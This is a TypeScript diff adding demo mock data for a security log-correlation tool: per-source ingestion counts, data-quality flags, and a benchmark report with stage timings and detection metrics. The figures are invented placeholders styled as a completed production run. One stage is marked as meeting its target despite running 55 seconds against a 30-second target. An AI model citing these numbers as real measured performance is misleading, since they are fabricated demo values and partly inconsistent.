+  reconciliation_balanced: true, // 320,140 + 3,410,260 + 120,710,000 + 18,410,000 = 142,850,400
+  total_detections: 4892,
+  total_attack_steps: 84,
+  total_incidents: 14,
+  flags_summary: {
+    "HOST_INFERRED": 18400,
+    "TIMESTAMP_UNCERTAIN": 12150,
+    "UNKNOWN_EVENT_TYPE": 3920,
+    "CLOCK_SKEW_DETECTED": 1400,
+    "LATE_ARRIVING": 850,
+    "TRUNCATED_RECORD": 420,
+    "MISSING_CRITICAL_FIELD": 310
+  },
+  sources: [
+    {
+      source_name: "Security_Audit_EVTX",
+      source_type: "windows_security_event_log",
+      records_read: 78400000,
+      malformed: 110000,
+      duplicate_dropped: 1200000,
+      valid_excluded: 67090000,
+      eligible: 10000000,
+      parse_success_rate_pct: 99.86,
+      inferred_hosts_count: 4200,
+      inferred_ts_count: 0,
+      unknown_events_count: 120
+    },
+    {
+      source_name: "Sysmon_Telemetry",
+      source_type: "microsoft_sysmon",
+      records_read: 32450400,
+      malformed: 42140,
+      duplicate_dropped: 810260,
+      valid_excluded: 27198000,
+      eligible: 4400000,
+      parse_success_rate_pct: 99.87,
+      inferred_hosts_count: 0,
+      inferred_ts_count: 0,
+      unknown_events_count: 40
+    },
+    {
+      source_name: "Perimeter_PaloAlto_Firewall",
+      source_type: "firewall_traffic_log",
+      records_read: 21000000,
+      malformed: 120000,
+      duplicate_dropped: 900000,
+      valid_excluded: 17480000,
+      eligible: 2500000,
+      parse_success_rate_pct: 99.43,
+      inferred_hosts_count: 14200,
+      inferred_ts_count: 12150,
+      unknown_events_count: 1800
+    },
+    {
+      source_name: "Zeek_Network_Metadata",
+      source_type: "zeek_network_flow",
+      records_read: 11000000,
+      malformed: 48000,
+      duplicate_dropped: 500000,
+      valid_excluded: 8942000,
+      eligible: 1510000,
+      parse_success_rate_pct: 99.56,
+      inferred_hosts_count: 0,
+      inferred_ts_count: 0,
+      unknown_events_count: 1960
+    }
+  ]
+};
+
+export const DEMO_BENCHMARK_REPORT: BenchmarkReport = {
+  tier_name: "Advanced Tier (Primary Competition Target)",
+  dataset_size_gb: 30.0,
+  multiplier: "1.3×",
+  target_hardware: {
+    cores: 8,
+    ram_gb: 16,
+    container_cap_gb: 8
+  },
+  total_duration_seconds: 2292, // 38 minutes 12 seconds
+  target_duration_seconds: 2700, // 45 minutes target (1 hour threshold)
+  peak_container_memory_mb: 6574, // 6.42 GB peak (well below 8 GB hard cap)
+  target_memory_mb: 8192,
+  peak_temp_disk_mb: 28400, // 28.4 GB temporary spill & compacted parquet
+  sustained_throughput_mbs: 13.4, // MB/s (exceeds 8.3 MB/s target)
+  target_throughput_mbs: 8.3,
+  investigation_latency_ms: 84, // Sub-100ms investigation response
+  target_latency_ms: 200,
+  metrics: {
+    detection_recall_pct: 94.6,
+    target_recall_pct: 92.0,
+    label_accuracy_pct: 91.2,
+    target_label_accuracy_pct: 88.0,
+    path_reconstruction_pct: 100.0,
+    target_path_reconstruction_pct: 100.0,
+    false_alarm_rate_pct: 4.2,
+    target_false_alarm_pct: 8.0
+  },
+  stages: [
+    {
+      stage_name: "File Ingestion & Stream Decompression",
+      target_seconds: 600,
+      measured_seconds: 482,
+      target_throughput_mbs: 50.0,
+      measured_throughput_mbs: 62.2,
+      status: "EXCEEDED_TARGET"
+    },
+    {
+      stage_name: "DuckDB Parsing & Canonical Normalization",
+      target_seconds: 750,
+      measured_seconds: 610,
+      target_throughput_mbs: 40.0,
+      measured_throughput_mbs: 49.2,
+      status: "EXCEEDED_TARGET"
+    },
+    {
+      stage_name: "Zstandard Parquet Compaction & Partitioning",
+      target_seconds: 350,
+      measured_seconds: 295,
+      target_throughput_mbs: 85.0,
+      measured_throughput_mbs: 101.7,
+      status: "EXCEEDED_TARGET"
+    },
+    {
+      stage_name: "SQL-Compiled Detection Rules Engine",
+      target_seconds: 400,
+      measured_seconds: 340,
+      status: "EXCEEDED_TARGET"
+    },
+    {
+      stage_name: "Entity Resolution (User/Host/IP Aliasing)",
+      target_seconds: 200,
+      measured_seconds: 172,
+      status: "EXCEEDED_TARGET"
+    },
+    {
+      stage_name: "Evidence Correlation & Hub-Discounted Clustering",
+      target_seconds: 250,
+      measured_seconds: 228,
+      status: "MET_TARGET"
+    },
+    {
+      stage_name: "Attack Path Causal Ordering & Reachability",
+      target_seconds: 120,
+      measured_seconds: 110,
+      status: "MET_TARGET"
+    },
+    {
+      stage_name: "Precomputed Incident Artifact Serialization",
+      target_seconds: 30,
+      measured_seconds: 55,
+      status: "MET_TARGET"
+    }
+  ],
+  status: "COMPLETED",
+  last_run_timestamp: "2026-10-31T09:12:45Z"
+};
+
+export const DEMO_PROCESSING_STATUS: ProcessingStatusResponse = {
+  run_id: "RUN-30GB-PROD-01",
+  status: "COMPLETED",
+  current_stage: "Precomputed Incident Artifact Serialization",
+  progress_pct: 100,
+  elapsed_seconds: 2292,
+  records_processed: 142850400,
+  eligible_events_found: 18410000,
+  detections_count: 4892,
+  incidents_count: 14,
+  peak_memory_mb: 6574,
+  error_message: null
+};
+
